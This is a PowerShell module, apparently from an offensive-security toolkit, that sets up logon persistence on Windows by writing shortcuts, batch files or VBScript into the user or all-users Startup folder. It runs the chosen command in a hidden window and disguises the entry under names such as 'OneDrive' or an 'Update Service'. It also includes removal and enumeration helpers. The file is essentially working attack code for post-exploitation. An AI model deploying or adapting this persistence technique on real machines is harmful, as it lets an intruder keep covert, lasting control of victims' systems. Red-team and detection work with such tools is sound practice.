<#
.SYNOPSIS
    Establish persistence via Windows Startup folders

.DESCRIPTION
    Creates shortcuts or scripts in Startup folders that execute at user logon.
    Simple but effective persistence mechanism.

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER Command
    Command or path to execute

.PARAMETER Name
    Name for the shortcut/script file

.PARAMETER AllUsers
    Place in all users startup (requires admin)

.PARAMETER Method
    Shortcut (.lnk) or batch script (.bat)

.EXAMPLE
    Invoke-StartupPersistence -Command "powershell.exe -WindowStyle Hidden -File C:\update.ps1" -Name "OneDrive"
    Invoke-StartupPersistence -Name "OneDrive" -Remove
#>

function Invoke-StartupPersistence {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'Add')]
        [string]$Command,

        [Parameter(Mandatory)]
        [string]$Name,

        [Parameter(ParameterSetName = 'Add')]
        [switch]$AllUsers,

        [Parameter(ParameterSetName = 'Add')]
        [ValidateSet('Shortcut', 'Batch', 'VBScript')]
        [string]$Method = 'Shortcut',

        [Parameter(ParameterSetName = 'Remove')]
        [switch]$Remove
    )

    # Determine startup folder path
    $startupPath = if ($AllUsers) {
        "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    }
    else {
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    }

    # File extension based on method
    $extension = switch ($Method) {
        'Shortcut' { '.lnk' }
        'Batch' { '.bat' }
        'VBScript' { '.vbs' }
    }

    $filePath = Join-Path $startupPath "$Name$extension"

    if ($Remove) {
        Write-Host "[*] Removing startup persistence: $Name" -ForegroundColor Yellow

        # Try all extensions
        @('.lnk', '.bat', '.vbs') | ForEach-Object {
            $path = Join-Path $startupPath "$Name$_"
            if (Test-Path $path) {
                Remove-Item $path -Force
                Write-Host "[+] Removed: $path" -ForegroundColor Green
            }
        }
        return
    }

    if (-not $Command) {
        Write-Error "Command is required when adding persistence"
        return
    }

    # Check admin requirement
    if ($AllUsers) {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Error "Administrator privileges required for All Users startup"
            return
        }
    }

    Write-Host @"

============================================================
  STARTUP FOLDER PERSISTENCE
============================================================
  Folder: $startupPath
  File: $Name$extension
  Method: $Method
  Command: $Command
============================================================

"@ -ForegroundColor Cyan

    try {
        switch ($Method) {
            'Shortcut' {
                # Create shortcut using WScript.Shell COM object
                $WshShell = New-Object -ComObject WScript.Shell
                $shortcut = $WshShell.CreateShortcut($filePath)

                # Parse command into target and arguments
                if ($Command -match '^"?([^"\s]+)"?\s*(.*)$') {
                    $shortcut.TargetPath = $Matches[1]
                    $shortcut.Arguments = $Matches[2]
                }
                else {
                    $shortcut.TargetPath = $Command
                }

                $shortcut.WorkingDirectory = "C:\Windows\System32"
                $shortcut.WindowStyle = 7  # Hidden
                $shortcut.Description = "$Name Update Service"
                $shortcut.Save()

                [System.Runtime.Interopservices.Marshal]::ReleaseComObject($WshShell) | Out-Null
            }

            'Batch' {
                $batchContent = @"
@echo off
$Command
"@
                Set-Content -Path $filePath -Value $batchContent -Force
            }

            'VBScript' {
                # VBScript for hidden execution
                $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "$Command", 0, False
Set WshShell = Nothing
"@
                Set-Content -Path $filePath -Value $vbsContent -Force
            }
        }

        Write-Host "[+] Startup persistence created: $filePath" -ForegroundColor Green

        Write-Host @"

[*] VERIFICATION:
    dir "$startupPath"

[*] REMOVAL:
    Invoke-StartupPersistence -Name "$Name" -Remove
    # Or: del "$filePath"
"@ -ForegroundColor Cyan

    }
    catch {
        Write-Error "Failed to create startup persistence: $_"
    }
}

function Get-StartupItems {
    <#
    .SYNOPSIS
        List all startup folder items

    .EXAMPLE
        Get-StartupItems
    #>
    [CmdletBinding()]
    param()

    $folders = @(
        @{ Path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Scope = "Current User" }
        @{ Path = "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Scope = "All Users" }
    )

    $items = @()

    foreach ($folder in $folders) {
        if (Test-Path $folder.Path) {
            $files = Get-ChildItem $folder.Path -ErrorAction SilentlyContinue

            foreach ($file in $files) {
                $target = $null

                if ($file.Extension -eq '.lnk') {
                    try {
                        $shell = New-Object -ComObject WScript.Shell
                        $shortcut = $shell.CreateShortcut($file.FullName)
                        $target = "$($shortcut.TargetPath) $($shortcut.Arguments)"
                        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
                    }
                    catch { }
                }
                else {
                    $target = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                }

                $items += [PSCustomObject]@{
                    Scope    = $folder.Scope
                    Name     = $file.Name
                    Path     = $file.FullName
                    Target   = $target
                    Modified = $file.LastWriteTime
                }
            }
        }
    }

    if ($items.Count -gt 0) {
        Write-Host "[+] Found $($items.Count) startup items:" -ForegroundColor Green
        return $items | Format-List
    }
    else {
        Write-Host "[-] No startup items found" -ForegroundColor Yellow
    }
}

# Export functions
Export-ModuleMember -Function Invoke-StartupPersistence, Get-StartupItems
